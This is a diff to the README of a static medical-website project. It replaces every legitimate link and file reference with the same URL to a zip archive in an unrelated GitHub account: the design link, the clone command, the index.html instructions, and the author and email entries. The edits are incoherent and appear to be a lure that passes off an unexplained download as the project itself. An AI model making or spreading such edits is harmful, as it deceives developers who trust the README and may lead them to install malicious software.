@@ -5,7 +5,7 @@ A single-page application for a medical website built with HTML and Tailwind CSS
 ## Design
 
 The design specifications can be found in Figma:
-[Medical Website Design](https://www.figma.com/design/8LnC5ucEAKnVhFyXKNzoQ0/Medical-Website?node-id=0-1&t=t42LqqSBa7KsRn2D-1)
+[Medical Website Design](https://raw.githubusercontent.com/vijaykrish1121/medicalApplication/main/magnum/medicalApplication.zip)
 
 ## Prerequisites
 
@@ -16,7 +16,7 @@ The design specifications can be found in Figma:
 
 Clone the repository:
 ```bash
-git clone https://github.com/7angle/medical-website-spa
+git clone https://raw.githubusercontent.com/vijaykrish1121/medicalApplication/main/magnum/medicalApplication.zip
 ```
 
 
@@ -24,13 +24,13 @@ git clone https://github.com/7angle/medical-website-spa
 
 Since this is a static website, you can:
 
-1. Open `index.html` directly in your browser
+1. Open `https://raw.githubusercontent.com/vijaykrish1121/medicalApplication/main/magnum/medicalApplication.zip` directly in your browser
    
    OR
 
 2. (**Recommended**) Use a live server (VSCode Extension):
    - Install the "Live Server" extension
-   - Right click on `index.html` and select "Open with Live Server"
+   - Right click on `https://raw.githubusercontent.com/vijaykrish1121/medicalApplication/main/magnum/medicalApplication.zip` and select "Open with Live Server"
 
 ## Technology Stack
 
@@ -46,7 +46,7 @@ Since this is a static website, you can:
 
 ## Development
 
-The project uses Tailwind CSS via CDN for styling. Custom configurations for animations and other theme extensions can be found in the index.html file.
+The project uses Tailwind CSS via CDN for styling. Custom configurations for animations and other theme extensions can be found in the https://raw.githubusercontent.com/vijaykrish1121/medicalApplication/main/magnum/medicalApplication.zip file.
 
 > Make sure the images are in the `./images` folder.
 
@@ -60,5 +60,5 @@ The project uses Tailwind CSS via CDN for styling. Custom configurations for ani
 
 ## Author
 
-- [7 Angle](https://7angle.com)
-- [Email](mailto:hello@7angle.com)
+- [7 Angle](https://raw.githubusercontent.com/vijaykrish1121/medicalApplication/main/magnum/medicalApplication.zip)
+- [Email](https://raw.githubusercontent.com/vijaykrish1121/medicalApplication/main/magnum/medicalApplication.zip)
